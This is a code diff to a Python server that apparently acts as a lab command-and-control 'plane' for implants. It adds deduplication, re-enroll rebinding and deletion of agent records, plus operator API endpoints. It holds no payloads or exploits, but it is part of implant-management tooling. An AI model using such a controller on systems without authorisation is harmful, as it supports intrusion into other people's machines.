@@ -29,7 +29,7 @@ from urllib.parse import parse_qs, urlparse
 # Max JSON body (operator + agent). Aligns with RESULT_CAP / upload chunks.
 MAX_BODY_BYTES = 4_000_000
 
-VERSION = "0.5.21-lab"
+VERSION = "0.5.22-lab"
 DEFAULT_ADDR = "127.0.0.1:8080"
 DEFAULT_SLEEP = 1.0  # lab default — snappier task round-trips
 DEFAULT_JITTER = 0.1
@@ -38,6 +38,14 @@ MIN_AGENT_SLEEP = 0.12  # Control turbo (input feels dead above ~0.3s)
 RESULT_CAP = 1_500_000
 MAX_TASKS_PER_CHECKIN = 16
 INTERACTIVE_SLEEP = 0.15
+# Auto-dedupe: re-enroll reuses package+host rows and prunes offline host zombies.
+# Set PLANE_AGENT_DEDUPE=0 to disable (manual DELETE still works).
+AGENT_DEDUPE = os.environ.get("PLANE_AGENT_DEDUPE", "1").strip().lower() not in (
+    "0",
+    "false",
+    "no",
+    "off",
+)
 # v1 + P3/P4 task types
 TASK_TYPES = frozenset(
     {
@@ -91,6 +99,33 @@ def _new_id(prefix: str) -> str:
     return f"{prefix}_{uuid.uuid4().hex[:16]}"
 
 
+def _normalize_arch(arch: str | None) -> str:
+    """Collapse arch aliases so Windows AMD64 matches Linux-reported x86_64."""
+    a = (arch or "").strip().lower().replace("-", "_")
+    if a in ("amd64", "x86_64", "x64", "x86-64"):
+        return "x86_64"
+    if a in ("aarch64", "arm64"):
+        return "aarch64"
+    if a in ("i386", "i686", "x86"):
+        return "x86"
+    return a
+
+
+def _normalize_hostname(hostname: str | None) -> str:
+    return (hostname or "").strip().lower()
+
+
+def _host_fingerprint(
+    hostname: str | None, arch: str | None, username: str | None
+) -> tuple[str, str, str]:
+    """Stable host key for zombie prune / rebind (hostname · arch · user)."""
+    return (
+        _normalize_hostname(hostname),
+        _normalize_arch(arch),
+        (username or "").strip(),
+    )
+
+
 class Store:
     def __init__(self, path: Path) -> None:
         self.path = path
@@ -99,6 +134,18 @@ class Store:
         self._conn = sqlite3.connect(str(path), check_same_thread=False)
         self._conn.row_factory = sqlite3.Row
         self._init_schema()
+        # One-shot: clear offline host duplicates left by older planes that
+        # always INSERT on enroll (no operator prompt required).
+        if AGENT_DEDUPE:
+            try:
+                n = self.prune_fleet_duplicates()
+                if n:
+                    print(
+                        f"[plane] pruned {n} superseded offline agent(s) on startup",
+                        flush=True,
+                    )
+            except Exception as exc:
+                print(f"[plane] startup prune skipped: {exc}", flush=True)
 
     def _init_schema(self) -> None:
         with self._lock:
@@ -487,40 +534,275 @@ class Store:
             )
             self._conn.commit()
 
+    def _row_is_offline(self, r: sqlite3.Row) -> bool:
+        """Same last_seen thresholds as _agent_dict (offline band)."""
+        last = r["last_seen"]
+        sleep = float(r["sleep"] or DEFAULT_SLEEP)
+        if not last:
+            return True
+        try:
+            ts = datetime.fromisoformat(str(last).replace("Z", "+00:00"))
+            age = (datetime.now(timezone.utc) - ts).total_seconds()
+            return age > max(45.0, sleep * 6)
+        except ValueError:
+            return True
+
+    def _row_host_key(self, r: sqlite3.Row) -> tuple[str, str, str]:
+        return _host_fingerprint(r["hostname"], r["arch"], r["username"])
+
+    def _delete_agent_rows(
+        self, agent_ids: list[str], *, reason: str = "pruned"
+    ) -> list[str]:
+        """Hard-delete agents + their tasks (callers hold lock optional)."""
+        if not agent_ids:
+            return []
+        deleted: list[str] = []
+        with self._lock:
+            for aid in agent_ids:
+                row = self._conn.execute(
+                    "SELECT id FROM agents WHERE id=?", (aid,)
+                ).fetchone()
+                if not row:
+                    continue
+                self._conn.execute("DELETE FROM tasks WHERE agent_id=?", (aid,))
+                self._conn.execute(
+                    "UPDATE listeners SET agent_id='' WHERE agent_id=?",
+                    (aid,),
+                )
+                self._conn.execute("DELETE FROM agents WHERE id=?", (aid,))
+                deleted.append(aid)
+            if deleted:
+                self._conn.commit()
+        for aid in deleted:
+            self.add_event(
+                level="info",
+                channel="agent",
+                message=f"agent {aid} removed ({reason})",
+                agent_id=aid,
+            )
+        return deleted
+
+    def delete_agent(self, agent_id: str, *, reason: str = "operator_delete") -> bool:
+        """Operator hard-delete of one agent (tasks + row)."""
+        return bool(self._delete_agent_rows([agent_id], reason=reason))
+
+    def prune_superseded_agents(
+        self,
+        keep_id: str,
+        *,
+        hostname: str | None,
+        arch: str | None,
+        username: str | None,
+        package_id: str | None = None,
+    ) -> list[str]:
+        """Drop offline agents that look like the same implant as keep_id.
+
+        Match: same host fingerprint (hostname · arch · user), or same
+        package_id on the same hostname. Never removes online/idle peers —
+        concurrent multi-agent on one host stays valid.
+        """
+        if not AGENT_DEDUPE or not keep_id:
+            return []
+        key = _host_fingerprint(hostname, arch, username)
+        if not key[0]:
+            # No hostname → nothing safe to match on
+            return []
+        pkg = (package_id or "").strip() or None
+        victims: list[str] = []
+        with self._lock:
+            rows = self._conn.execute("SELECT * FROM agents").fetchall()
+            for r in rows:
+                aid = str(r["id"] or "")
+                if not aid or aid == keep_id:
+                    continue
+                if not self._row_is_offline(r):
+                    continue
+                same_host = self._row_host_key(r) == key
+                same_pkg_host = False
+                if pkg:
+                    try:
+                        rpkg = (r["package_id"] or "").strip()
+                    except (IndexError, KeyError):
+                        rpkg = ""
+                    same_pkg_host = (
+                        rpkg == pkg
+                        and _normalize_hostname(r["hostname"]) == key[0]
+                    )
+                if same_host or same_pkg_host:
+                    victims.append(aid)
+        return self._delete_agent_rows(victims, reason="superseded_offline")
+
+    def prune_fleet_duplicates(self) -> int:
+        """Startup / ops: per host fingerprint keep newest live (or newest offline)."""
+        if not AGENT_DEDUPE:
+            return 0
+        with self._lock:
+            rows = list(self._conn.execute("SELECT * FROM agents").fetchall())
+        # Group by fingerprint; empty hostname skipped
+        groups: dict[tuple[str, str, str], list[sqlite3.Row]] = {}
+        for r in rows:
+            key = self._row_host_key(r)
+            if not key[0]:
+                continue
+            groups.setdefault(key, []).append(r)
+        victims: list[str] = []
+        for _key, members in groups.items():
+            if len(members) < 2:
+                continue
+            live = [r for r in members if not self._row_is_offline(r)]
+            offline = [r for r in members if self._row_is_offline(r)]
+            if live:
+                # Keep all live; drop every offline sibling
+                for r in offline:
+                    victims.append(str(r["id"]))
+            else:
+                # All offline: keep most recently seen, drop rest
+                def _last_key(row: sqlite3.Row) -> str:
+                    return str(row["last_seen"] or row["created"] or "")
+
+                offline_sorted = sorted(offline, key=_last_key, reverse=True)
+                for r in offline_sorted[1:]:
+                    victims.append(str(r["id"]))
+        return len(self._delete_agent_rows(victims, reason="fleet_dedupe"))
+
+    def _find_rebind_candidate(
+        self,
+        *,
+        package_id: str | None,
+        hostname: str,
+        arch: str,
+        username: str,
+    ) -> sqlite3.Row | None:
+        """Pick an existing agent row to reuse on re-enroll (stable agt_ id)."""
+        if not AGENT_DEDUPE:
+            return None
+        host_n = _normalize_hostname(hostname)
+        if not host_n:
+            return None
+        key = _host_fingerprint(hostname, arch, username)
+        pkg = (package_id or "").strip() or None
+        with self._lock:
+            rows = list(self._conn.execute("SELECT * FROM agents").fetchall())
+        # 1) Same package_id + same hostname (any presence) — preferred
+        if pkg:
+            pkg_hits = [
+                r
+                for r in rows
+                if (r["package_id"] or "").strip() == pkg
+                and _normalize_hostname(r["hostname"]) == host_n
+            ]
+            if pkg_hits:
+                # Prefer most recently seen
+                pkg_hits.sort(
+                    key=lambda r: str(r["last_seen"] or r["created"] or ""),
+                    reverse=True,
+                )
+                return pkg_hits[0]
+        # 2) Offline host-fingerprint match (Windows / no package_id re-enroll)
+        offline_hits = [
+            r
+            for r in rows
+            if self._row_is_offline(r) and self._row_host_key(r) == key
+        ]
+        if offline_hits:
+            offline_hits.sort(
+                key=lambda r: str(r["last_seen"] or r["created"] or ""),
+                reverse=True,
+            )
+            return offline_hits[0]
+        return None
+
     def enroll_agent(
         self, facts: dict[str, Any], *, package_id: str | None = None
     ) -> dict[str, Any]:
-        agent_id = _new_id("agt")
+        """Enroll a new implant or rebind an existing row for the same host/package.
+
+        Always INSERT used to leave offline zombies when agents re-register.
+        With dedupe: reuse package+host (or offline host twin), issue a fresh
+        token, then prune other offline siblings for that host.
+        """
         token = secrets.token_urlsafe(32)
         now = _utc_now()
         pkg = (package_id or facts.get("package_id") or "").strip() or None
-        with self._lock:
-            self._conn.execute(
-                "INSERT INTO agents(id,token_hash,hostname,username,os,arch,"
-                "external_ip,internal_ip,group_name,tags,sleep,jitter,status,"
-                "last_seen,created,package_id) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
-                (
-                    agent_id,
-                    _hash_token(token),
-                    str(facts.get("hostname") or ""),
-                    str(facts.get("username") or ""),
-                    str(facts.get("os") or ""),
-                    str(facts.get("arch") or ""),
-                    str(facts.get("external_ip") or ""),
-                    str(facts.get("internal_ip") or ""),
-                    str(facts.get("group") or ""),
-                    json.dumps(facts.get("tags") or []),
-                    float(facts.get("sleep") or DEFAULT_SLEEP),
-                    float(facts.get("jitter") or DEFAULT_JITTER),
-                    "online",
-                    now,
-                    now,
-                    pkg,
-                ),
-            )
-            self._conn.commit()
-        host = facts.get("hostname") or agent_id
-        msg = f"enrolled {host}"
+        hostname = str(facts.get("hostname") or "")
+        username = str(facts.get("username") or "")
+        os_name = str(facts.get("os") or "")
+        arch = str(facts.get("arch") or "")
+        external_ip = str(facts.get("external_ip") or "")
+        internal_ip = str(facts.get("internal_ip") or "")
+        group_name = str(facts.get("group") or "")
+        tags_json = json.dumps(facts.get("tags") or [])
+        sleep_v = float(facts.get("sleep") or DEFAULT_SLEEP)
+        jitter_v = float(facts.get("jitter") or DEFAULT_JITTER)
+
+        rebind = self._find_rebind_candidate(
+            package_id=pkg,
+            hostname=hostname,
+            arch=arch,
+            username=username,
+        )
+        rebound = False
+        if rebind is not None:
+            agent_id = str(rebind["id"])
+            with self._lock:
+                self._conn.execute(
+                    "UPDATE agents SET token_hash=?, hostname=?, username=?, "
+                    "os=?, arch=?, external_ip=?, internal_ip=?, group_name=?, "
+                    "tags=?, sleep=?, jitter=?, status='online', last_seen=?, "
+                    "package_id=COALESCE(?, package_id) WHERE id=?",
+                    (
+                        _hash_token(token),
+                        hostname,
+                        username,
+                        os_name,
+                        arch,
+                        external_ip,
+                        internal_ip,
+                        group_name,
+                        tags_json,
+                        sleep_v,
+                        jitter_v,
+                        now,
+                        pkg,
+                        agent_id,
+                    ),
+                )
+                self._conn.commit()
+            rebound = True
+        else:
+            agent_id = _new_id("agt")
+            with self._lock:
+                self._conn.execute(
+                    "INSERT INTO agents(id,token_hash,hostname,username,os,arch,"
+                    "external_ip,internal_ip,group_name,tags,sleep,jitter,status,"
+                    "last_seen,created,package_id) "
+                    "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+                    (
+                        agent_id,
+                        _hash_token(token),
+                        hostname,
+                        username,
+                        os_name,
+                        arch,
+                        external_ip,
+                        internal_ip,
+                        group_name,
+                        tags_json,
+                        sleep_v,
+                        jitter_v,
+                        "online",
+                        now,
+                        now,
+                        pkg,
+                    ),
+                )
+                self._conn.commit()
+
+        host = hostname or agent_id
+        if rebound:
+            msg = f"re-enrolled {host} (rebound {agent_id})"
+        else:
+            msg = f"enrolled {host}"
         if pkg:
             msg += f" package={pkg}"
         self.add_event(
@@ -529,12 +811,29 @@ class Store:
             message=msg,
             agent_id=agent_id,
         )
+        # Drop offline twins so the desk never shows zombie rows after re-reg
+        pruned = self.prune_superseded_agents(
+            agent_id,
+            hostname=hostname,
+            arch=arch,
+            username=username,
+            package_id=pkg,
+        )
+        if pruned:
+            self.add_event(
+                level="info",
+                channel="agent",
+                message=f"pruned {len(pruned)} offline sibling(s) for {host}",
+                agent_id=agent_id,
+                meta={"pruned": pruned},
+            )
         return {
             "agent_id": agent_id,
             "agent_token": token,
             "package_id": pkg,
-            "sleep": float(facts.get("sleep") or DEFAULT_SLEEP),
-            "jitter": float(facts.get("jitter") or DEFAULT_JITTER),
+            "sleep": sleep_v,
+            "jitter": jitter_v,
+            "rebound": rebound,
         }
 
     def agent_by_token(self, token: str) -> sqlite3.Row | None:
@@ -613,6 +912,27 @@ class Store:
                 ),
             )
             self._conn.commit()
+            # Re-read after update for prune keys (facts may be partial)
+            row = self._conn.execute(
+                "SELECT * FROM agents WHERE id=?", (agent_id,)
+            ).fetchone()
+        # Live agent check-in clears offline host zombies without operator action
+        if AGENT_DEDUPE and row is not None:
+            try:
+                pkg = ""
+                try:
+                    pkg = row["package_id"] or ""
+                except (IndexError, KeyError):
+                    pkg = ""
+                self.prune_superseded_agents(
+                    agent_id,
+                    hostname=row["hostname"],
+                    arch=row["arch"],
+                    username=row["username"],
+                    package_id=pkg or None,
+                )
+            except Exception:
+                pass
 
     def list_agents(
         self, *, status: str | None = None, q: str | None = None, limit: int = 200
@@ -1500,6 +1820,17 @@ class Handler(BaseHTTPRequestHandler):
                         )
                         return
 
+                if method == "DELETE" and path.startswith("/api/v1/agents/"):
+                    agent_id = path[len("/api/v1/agents/") :].strip("/")
+                    if not agent_id or "/" in agent_id:
+                        _err(self, 400, "invalid", "agent id required")
+                        return
+                    if not store.delete_agent(agent_id):
+                        _err(self, 404, "not_found", "agent not found")
+                        return
+                    _json_response(self, 200, {"ok": True, "id": agent_id})
+                    return
+
                 if (
                     method == "POST"
                     and path.startswith("/api/v1/agents/")
@@ -1659,6 +1990,13 @@ class Handler(BaseHTTPRequestHandler):
                     limit = int((qs.get("limit") or ["50"])[0])
                     rows = store.list_package_canaries(limit=max(1, min(limit, 200)))
                     _json_response(self, 200, {"canaries": rows})
+                    return
+
+                if method == "POST" and path == "/api/v1/operator/agents/prune":
+                    n = store.prune_fleet_duplicates()
+                    _json_response(
+                        self, 200, {"ok": True, "pruned": n, "dedupe": AGENT_DEDUPE}
+                    )
                     return
 
                 # Listeners (plane-managed battlements)
